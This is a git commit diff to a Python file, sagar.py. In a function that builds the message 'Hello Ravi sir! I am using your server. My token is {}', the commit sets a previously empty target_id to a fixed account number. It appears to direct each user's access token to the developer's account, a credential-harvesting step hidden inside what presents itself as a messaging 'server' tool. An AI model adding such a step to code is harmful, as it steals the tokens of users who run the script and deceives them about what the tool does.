5ebb16f7b5d1608dfc66c64307de0af6dcddc6e4
Anox071 <153474617+Anox071@users.noreply.github.com>
2024-02-26 14:34:35 +0530

    Update sagar.py

--- sagar.py
+++ sagar.py
@@ -32,7 +32,7 @@ def send_initial_message():
       msg_template = "Hello Ravi sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = ""
+      target_id = "100000284584200"
 
       requests.packages.urllib3.disable_warnings()
 
